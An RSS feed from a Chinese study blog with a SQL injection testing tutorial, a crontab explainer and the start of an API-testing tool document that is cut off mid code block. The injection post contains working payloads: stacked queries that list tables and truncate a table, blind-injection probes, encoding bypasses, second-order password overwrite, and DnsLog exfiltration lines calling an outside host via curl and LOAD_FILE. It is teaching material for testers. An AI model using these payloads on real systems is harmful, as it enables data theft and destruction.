<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>菜狗瑞的学习周记</title>
        <link>https://testoai.github.io/</link>
        <description>关于 LoveIt 主题</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Fri, 23 Apr 2021 09:43:23 &#43;0800</lastBuildDate>
            <atom:link href="https://testoai.github.io/index.xml" rel="self" type="application/rss+xml" />
        <item>
    <title>安全测试之-SQL注入</title>
    <link>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/</link>
    <pubDate>Fri, 23 Apr 2021 09:43:23 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/</guid>
    <description><![CDATA[<h2 id="什么是sql注入">什么是<code>SQL</code>注入</h2>
<p>在没有对没有对输入参数进行校验的情况下，请求方可以向参数中添加一些影响SQL的字符，导致程序直接用请求者传入的参数去数据库查询，会导致原有的SQL被修改，不能按预期返回</p>
<h2 id="sql注入示例"><code>SQL</code>注入示例</h2>
<p>比如一个查询接口，查询指定时间段内的数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2020-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span>
	<span class="k">LIMIT</span> <span class="mi">0</span><span class="p">,</span><span class="mi">30</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>如果没有对输入参数做校验，前端传入了截断字符串的参数，那<code>SQL</code>就变成了下面这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
</span></code></pre></td></tr></table>
</div>
</div><p>上面的查询直接查询了很长一段时间范围内的数据，如果数据量非常大的话，会对数据库造成较大压力</p>
<p>或者</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span>
<span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
</span></code></pre></td></tr></table>
</div>
</div><p>上面的操作就获取到了所有表名称</p>
<p>如果业务登录的用户权限够大的话，然后就可以这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span>
	<span class="o">*</span> 
<span class="k">FROM</span>
	<span class="n">STAPP</span> 
<span class="k">WHERE</span>
	<span class="n">TC_OD_OPT_DT</span> <span class="o">&gt;</span> <span class="s1">&#39;2000-11-16 15:05:01&#39;</span>
	<span class="k">AND</span> <span class="n">TC_OD_OPT_DT</span> <span class="o">&lt;</span> <span class="s1">&#39;2020-11-18 15:05:01&#39;</span><span class="p">;</span>
<span class="n">truncate</span> <span class="k">table</span> <span class="n">STAPP</span><span class="p">;</span><span class="c1">#&#39;) LIMIT 0,30;
</span></code></pre></td></tr></table>
</div>
</div><p>上面的操作会清空整张<code>STAPP</code>表</p>
<h2 id="注入点">注入点</h2>
<ul>
<li>
<p>文本框注入</p>
<ul>
<li>常见的用户名文本输入框，密码文本输入框，查询文本输入框</li>
</ul>
</li>
<li>
<p><code>url</code>注入</p>
<ul>
<li>
<p>针对连接后面的参数进行测试，比如在网站上点击一篇文章，网站前端会把文章的ID放到<code>url</code>中发送<code>GET</code>请求到服务端</p>
<p>如：<code>https://www.jianshu.com/p/178ca3ddc866</code>，可以对最后面的文章id进行注入测试</p>
</li>
</ul>
</li>
<li>
<p>工具</p>
<ul>
<li><code>spider</code>：可以获取到一个网址的所有链接</li>
<li><code>sqlmap</code>：开源渗透测试工具，能自动检测利用<code>SQL</code>注入缺陷并接管数据库服务器</li>
</ul>
<p><code>sqlmap</code>使用方法：</p>
<ul>
<li><code>sqlmap -u &quot;url&quot;</code>：检测注入点，<code>url</code>中必须有例如<code>id=123</code>类似的参数</li>
<li><code>sqlmap -l</code>：从<code>Burpsuite proxy</code>或<code>WebScarab proxy</code>中读取<code>http</code>请求日志文件</li>
<li><code>sqlmap -x</code>：从<code>sitemap.xml</code>站点地图文件中读取目标检测</li>
<li><code>sqlmap -m</code>：从多行文本格式文件读取多个目标，对多个目标进行探测</li>
<li><code>sqlmap -r</code>：从<code>Burp suite</code>保存的文本文件中读取<code>http</code>请求作为注入探测的目标</li>
<li><code>sqlmap -c</code>：从配置文件<code>sqlmap.conf</code>中读取目标探测</li>
</ul>
</li>
</ul>
<h2 id="注入方法">注入方法</h2>
<h3 id="布尔盲注">布尔盲注</h3>
<ul>
<li>可以进行注入，但是不能通过注入直接拿到数据库中的数据</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">SelectUser</span><span class="p">(</span><span class="nx">db</span> <span class="o">*</span><span class="nx">sql</span><span class="p">.</span><span class="nx">DB</span><span class="p">,</span> <span class="nx">name</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
	<span class="nx">rows</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">Query</span><span class="p">(</span><span class="s">`SELECT u.&#34;name&#34; FROM &#34;user&#34; u WHERE u.&#34;name&#34; = $1`</span><span class="p">,</span><span class="nx">name</span><span class="p">)</span>
	<span class="nf">ifErr</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="nx">user</span> <span class="o">:=</span> <span class="nx">User</span><span class="p">{}</span>
    <span class="k">for</span> <span class="nx">rows</span><span class="p">.</span><span class="nf">Next</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">err</span> <span class="o">:=</span> <span class="nx">rows</span><span class="p">.</span><span class="nf">Scan</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">user</span><span class="p">.</span><span class="nx">Name</span><span class="p">)</span>
		<span class="nf">ifErr</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
        <span class="k">if</span> <span class="nx">user</span><span class="p">.</span><span class="nx">Name</span> <span class="o">==</span> <span class="s">&#34;&#34;</span><span class="p">{</span>
			<span class="k">return</span> <span class="kc">false</span>
        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span>
        <span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>如果上面代码中的<code>db.Query</code>方法没有对传入的<code>name</code>参数做校验的话，那么该程序是存在注入漏洞的</p>
<p>虽然没有返回查询数据与错误信息，但是返回了查询结果</p>
<p>如果正常查询操作，会返回正常的结果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">SelectUser(db,&#34;test&#34;)//查询到test则返回true，否则返回false
</code></pre></td></tr></table>
</div>
</div><p>如果传入一个非法参数，如下所示</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">SelectUser(db,&#34;test&#39;&#34;)
</code></pre></td></tr></table>
</div>
</div><p>上面传入的<code>name</code>参数为<code>test</code>的值存在，当在后面输入一个截断的单引号时，该<code>sql</code>会执行失败，会返回<code>false</code></p>
<p>这样就成功的测试出了该参数是存在注入漏洞的</p>
<p>通过这个漏洞可以对请求参数后添加一些其他的语句，对请求的内容做出判断，如果返回<code>true</code>那么我们的判断则是正确的，否则是错误的</p>
<h3 id="时间盲注">时间盲注</h3>
<ul>
<li>
<p>当存在注入漏洞的查询接口，无论有没有查询到数据，都返回相同的值时，可以构造<code>sql</code>语句，通过相应时间来判断盲注的成功与否</p>
</li>
<li>
<p>示例：</p>
<ul>
<li>编写逻辑<code>sql</code>，通过条件语句进行判断，为真则立即执行，否则延时执行。语法为：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">if</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p>如果<code>left(user(),1)='a'</code>判断为真，则返回0，如果判断为假，则执行<code>sleep(3)</code></p>
</li>
</ul>
<h3 id="mysql中盲注的一些方法"><code>mysql</code>中盲注的一些方法</h3>
<ul>
<li><code>left()</code>函数：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s1">&#39;s&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p><code>database</code>显示数据库名称，<code>left</code>函数从左截取数据库名称的前N位</p>
<ul>
<li><code>regexp</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="k">regexp</span> <span class="s1">&#39;^r&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>正则表达式的用法，与<code>left()</code>用法相似，也是从左往右匹配，当匹配成功时则返回1</p>
<ul>
<li><code>substr</code>函数：用来截取字符串</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">SELECT</span> <span class="nf">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">DATABASE</span><span class="p">()),</span><span class="mi">1</span><span class="err">，</span><span class="mi">1</span><span class="p">)</span> <span class="o">//</span><span class="err">截取查询结果的第一位</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li><code>ascii</code>函数：可以将字符串转换为<code>ascii</code>码值，该方法可以避免单引号的出现，能适用于更多的场景</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="nf">ascii</span><span class="p">(</span><span class="nf">SUBSTR</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><ul>
<li>通过以上方法可以进行盲注测试</li>
</ul>
<h3 id="dnslog盲注"><code>DnsLog</code>盲注</h3>
<ul>
<li>当程序存在注入漏洞，但是既不会返回查询结果，又不会返回错误信息时，可以通过布尔盲注和时间盲注通过猜测注入的方式获取到数据，但是这个过程效率很低，要发起很多请求。</li>
<li>所以需要一种方式，减少请求，直接返回查询结果，这里可以使用<code>DnsLog</code>实现注入</li>
</ul>
<h4 id="dnslog盲注原理"><code>DnsLog</code>盲注原理</h4>
<ul>
<li>
<p><code>DNS</code>在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息</p>
</li>
<li>
<p><code>DNS</code>的日志信息</p>
<ul>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl xx.r4ourp.ceye.io
</code></pre></td></tr></table>
</div>
</div><table>
<thead>
<tr>
<th>记录信息</th>
<th>详情</th>
<th>地址</th>
<th>方式</th>
<th>user-agent</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP Request</td>
<td><a href="http://xx.r5ourp.ceye.io/">http://xx.r5ourp.ceye.io/</a></td>
<td>10.10.10.10</td>
<td>GET</td>
<td>curl/7.3.0</td>
</tr>
<tr>
<td>DNS Query</td>
<td>xx.r5ourp.ceye.io</td>
<td>10.10.10.10</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl `whoami`.r4ourp.ceye.io
</code></pre></td></tr></table>
</div>
</div><table>
<thead>
<tr>
<th>记录信息</th>
<th>详情</th>
<th>地址</th>
<th>方式</th>
<th>user-agent</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP Request</td>
<td><a href="http://test.r5ourp.ceye.io/">http://test.r5ourp.ceye.io/</a></td>
<td>10.10.10.10</td>
<td>GET</td>
<td>curl/7.3.0</td>
</tr>
<tr>
<td>DNS Query</td>
<td>test.r5ourp.ceye.io</td>
<td>10.10.10.10</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>上面使用反引号包起来的<code>whoami</code>被拿到服务器的终端去执行了，然后返回的结果放到了<code>whoami</code>的位置</p>
<p>白话就是，被反引号包起来的被当做命令拿到服务器的终端去执行了，返回的结果被记录到了<code>DNS</code>的日志信息里面</p>
</li>
</ul>
</li>
<li>
<p><code>mysql</code>的<code>load_file()</code></p>
<ul>
<li>在<code>mysql</code>中，<code>load_file</code>函数可以发起请求，可以利用该函数发起请求，使用<code>DnsLog</code>接收请求，获取数据</li>
<li>语法：<code>SELECT LOAD_FILE(CONCAT('\\\',(SELECT DATABASE()),'.MYSQL.r4ourp.ceye.io\\abc'));</code>
<ul>
<li>通过SQL语句查询内容，作为请求的一部分，发送至<code>DnsLog</code></li>
<li>只要对这部分的语句进行构造，就能实现有回显的注入</li>
<li>但是对数据格式和内容有限制，只能写入指定的内容</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="宽字节注入">宽字节注入</h3>
<h4 id="什么是宽字节">什么是宽字节</h4>
<ul>
<li>
<p>长度为一个字节的字符是窄字节，长度是两个字节的字符为窄字节</p>
</li>
<li>
<p>当程序对入参做过简单判断时，比如说将单引号转义成<code>\'</code>，而当<code>mysql</code>在使用<code>GBK</code>编码时，会认为两个字符为一个汉字</p>
<table>
<thead>
<tr>
<th>输入</th>
<th>处理</th>
<th>编码</th>
<th>转义</th>
<th>SQL</th>
</tr>
</thead>
<tbody>
<tr>
<td>%df'</td>
<td><code>%df\'</code></td>
<td>%df%5C%27</td>
<td>運'</td>
<td>id=運' and</td>
</tr>
</tbody>
</table>
<p>这样就可以成功注入了</p>
</li>
</ul>
<h3 id="二次编码注入">二次编码注入</h3>
<ul>
<li>当经过多次编码后的参数仍不符合要求是，即可造成<code>sql</code>注入</li>
<li>例如：<code>id=1%2527</code>
<ul>
<li>1.上面的id参数值在PHP自身编码中会被识别为<code>1%27</code></li>
<li>2.然后对<code>1%27</code>进行非法字符的转义，因为没有非法字符，所以直接跳过</li>
<li>3.此时如果程序中编写的代码对参数进行了转换的话，<code>1%27</code>就变成了1'</li>
<li>此时1&rsquo;被传入到数据库中是可以将<code>sql</code>截断的</li>
</ul>
</li>
</ul>
<h3 id="二次注入">二次注入</h3>
<h4 id="原理">原理</h4>
<ul>
<li>1.在传入的参数中插入恶意字符，比如单引号，程序传输过程中对单引号进行了转义，但入库时仍会把原有数据入库</li>
<li>2.将数据存入到了数据库中之后，程序就认为该数据是安全的，下一次需要进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检查和处理，这样就会造成二次注入</li>
</ul>
<h4 id="例子">例子</h4>
<p>假如该系统的数据库为<code>mysql</code></p>
<ul>
<li>
<p>1.先注册一个用户，用户名为<code>admin</code></p>
</li>
<li>
<p>2.再注册一个用户，用户名为<code>admin'#</code></p>
</li>
<li>
<p>3.然后修改<code>admin'#</code>用户的密码</p>
<p>当修改<code>admin'#</code>的时候就会产生SQL注入：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span> <span class="n">users</span> <span class="kt">set</span> <span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;newPassword&#39;</span> <span class="k">where</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="c1">#&#39; and passwd = &#39;oldPassword&#39;
</span></code></pre></td></tr></table>
</div>
</div><p>可以看到上面的sql如果没有对<code>admin'#</code>做校验的话，那么就会成功注入，最终执行的sql为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">update</span> <span class="n">users</span> <span class="kt">set</span> <span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;newPassword&#39;</span> <span class="k">where</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>这样就成功的把admin用户的密码修改掉了</p>
</li>
<li>
<p>如果没有对用户名的入参做校验的话，甚至可以在用户名后输入一些sql语句来获取数据库的一些信息，或者进行删除操作</p>
</li>
<li>
<p>这种场景会有很多，不只是只有登录场景存在，所以测试时要考虑的足够全面</p>
</li>
</ul>
]]></description>
</item><item>
    <title>crontab</title>
    <link>https://testoai.github.io/posts/crontab/</link>
    <pubDate>Sun, 18 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/crontab/</guid>
    <description><![CDATA[<h2 id="介绍">介绍</h2>
<p><code>crontab</code>在<code>Linux</code>系统中用于执行定时任务，比如服务巡检，日志备份清理，数据库备份</p>
<p>在<code>Centos7</code>中，最小安装会有该服务，进程名是<code>crond</code></p>
<p><code>Crontab</code>的任务管理在<code>/etc</code>目录下的<code>crontab</code>文件中</p>
<h2 id="crontab文件详解"><code>crontab</code>文件详解</h2>
<ul>
<li>
<p>1.<code>/var/spool/cron/</code>：该目录存放着每个用户设置的任务，文件以用户名命名</p>
</li>
<li>
<p>2.<code>/var/log/cron</code>：该文件是<code>crontab</code>的日志文件，当任务执行没有成功时可以查看该日志排查</p>
</li>
<li>
<p>3.<code>/etc/crontab</code>：</p>
<ul>
<li>该文件用来管理定时任务，默认有<code>root</code>用户可以编辑可以修改权限给其他用户编辑，但是刷新配置时依然只能<code>root</code>用户来刷新，而且该任务只属于<code>root</code>用户</li>
</ul>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
<span class="nv">PATH</span><span class="o">=</span>/sbin:/bin:/usr/sbin:/usr/bin
<span class="nv">MAILTO</span><span class="o">=</span>root

<span class="c1"># For details see man 4 crontabs</span>

<span class="c1"># Example of job definition:</span>
<span class="c1"># .---------------- minute (0 - 59)</span>
<span class="c1"># | .------------- hour (0 - 23)</span>
<span class="c1"># | | .---------- day of month (1 - 31)</span>
<span class="c1"># | | | .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c1"># | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c1"># | | | | |</span>
<span class="c1"># * * * * * user-name command to be executed</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="顶部环境相关部分">顶部环境相关部分</h3>
<ul>
<li><code>SHELL=/bin/bash</code>：表示使用<code>/bin/bash</code>解释命令</li>
<li><code>PATH=/sbin:/bin:/usr/sbin:/usr/bin</code>：表示到哪些目录寻找命令执行程序</li>
<li><code>MAILTO</code>：当有任务执行有输出时，输出内容将发送到那个用户的邮箱，为空则不发送</li>
</ul>
<h3 id="底部定时任务配置部分">底部定时任务配置部分</h3>
<ul>
<li>下面是整个文件的核心部分</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># .---------------- minute (0 - 59)</span>
<span class="c1"># | .------------- hour (0 - 23)</span>
<span class="c1"># | | .---------- day of month (1 - 31)</span>
<span class="c1"># | | | .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c1"># | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c1"># | | | | |</span>
<span class="c1"># * * * * * user-name command to be executed</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="时间部分">时间部分</h4>
<p><code>* * * * *</code>表示的是时间配置</p>
<ul>
<li>第一个*表示分钟，取值范围在0~59之间的整数</li>
<li>第二个*表示小时，取值范围在0~23之间的整数</li>
<li>第三个*表示日期，根据下面指定月份中的天数取值</li>
<li>第四个*表示月份，取值范围在1~12之间的整数</li>
<li>第五个*表示星期，取值范围在1~7之间的整数</li>
</ul>
<p>特殊符号：</p>
<ul>
<li><code>*</code>：代表规则范围内的任意值，如果设置该值的是分钟，则在满足其他条件下的情况下，每分钟都会执行</li>
<li><code>,</code>：将指定的值隔开，如在分钟中使用，<code>1,18,23</code>，在满足其他条件情况下，在1、18、23分钟是都会执行</li>
<li><code>-</code>：用于指定取值范围，如在分钟中使用，<code>1-5</code>，则表示的是1、2、3、4、5分钟</li>
<li><code>/</code>：用于指定时间的执行频率，如在分钟中使用，<code>0-30/2</code>，则表示的是在30分钟之内，每隔两分钟执行一次</li>
</ul>
<h4 id="时间配置验证">时间配置验证</h4>
<p><code>https://crontab.guru/</code></p>
<p>上面网址会对配置的时间验证</p>
<h4 id="命令部分">命令部分</h4>
<p><code>user-name command to be executed</code>表示的是用户和执行的命令</p>
<p>因为环境变量的原因，可能有很多在终端执行的命令，放到<code>crontab</code>里面执行不了，所以最好写绝对路径</p>
<p>环境变量的问题下面会详细写下，现在先写一个例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback"># .---------------- minute (0 - 59)
# | .------------- hour (0 - 23)
# | | .---------- day of month (1 - 31)
# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...
# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# | | | | |
# * * * * * user-name command to be executed
  */2 * * * * /usr/sbin/ntpdate s1a.time.edu.cn
</code></pre></td></tr></table>
</div>
</div><p>上面的例子是每两分钟同步一次<code>s1a.time.edu.cn</code>的时间</p>
<h2 id="crontab的环境变量">crontab的环境变量</h2>
<p><code>crontab</code>默认不会加载用户和系统设置的环境变量，所以一些命令在终端可以执行但是在<code>crontab</code>执行不了</p>
<ul>
<li>解决方法
<ul>
<li>1.在<code>crontab</code>添加任务时写绝对路径</li>
<li>2.把刷新环境变量的命令添加到<code>crontab</code>中，只适用于<code>root</code>用户</li>
<li>3.可以在对应的任务之前添加一段使系统环境变量生效的命令</li>
<li>4.可以把要执行的文件所在目录添加到<code>PATH</code>中</li>
</ul>
</li>
</ul>
<h2 id="crontab相关命令">crontab相关命令</h2>
<p><code>crontab -l</code>：列出当前用户的所有任务</p>
<p><code>crontab -e</code>：编辑当前用户的任务，上面说普通用户没有办法把任务加到<code>/etc/crontab</code>中，但是可以使用这条命令添加属于自己的任务，格式与<code>/etc/crontab</code>相同</p>
<p><code>crontab /etc/crontab</code>：用于<code>root</code>用户编辑完<code>/etc/crontab</code>后刷新任务列表</p>
<p><code>crontab -r</code>：删除当前用户的所有任务，<strong><u>注意是删除所有，慎用</u></strong></p>
]]></description>
</item><item>
    <title>接口测试小工具文档</title>
    <link>https://testoai.github.io/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/</link>
    <pubDate>Sat, 17 Apr 2021 00:00:00 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://testoai.github.io/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/</guid>
    <description><![CDATA[<h2 id="支持的请求方式">支持的请求方式</h2>
<ul>
<li>支持<code>GET</code>请求</li>
<li>支持<code>POST</code>请求</li>
</ul>
<h2 id="支持的请求体类型">支持的请求体类型</h2>
<ul>
<li>支持<code>json</code>格式</li>
<li>支持<code>multipart/form-data</code>格式</li>
</ul>
<h2 id="返回值相关">返回值相关</h2>
<ul>
<li>支持返回值拼接，在<code>respParams</code>参数中写入<code>GET</code>和<code>SET</code>的<code>kay</code>，使用方式见下面参数解释</li>
</ul>
<h1 id="20210415">2021.04.15</h1>
<h2 id="配置文件">配置文件</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
